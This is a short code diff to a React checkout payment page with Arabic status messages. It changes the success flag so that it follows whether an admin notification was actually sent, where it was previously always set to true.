@@ -336,7 +336,7 @@ export default function CheckoutPaymentPage() {
       setPaymentMessage(notified
         ? 'تم إرسال طلبك.'
         : 'تم التحقق من البيانات ✓، لكن تعذر إرسال إشعار الإدارة. اضغط «إكمال الدفع» مرة أخرى للمحاولة.');
-      setPaymentMessageSuccess(true);
+      setPaymentMessageSuccess(notified);
       if (notified) router.replace('/checkout/verify-phone');
     } catch (error) {
       setPaymentMessage(error instanceof Error ? error.message : 'تعذر إرسال الطلب.');
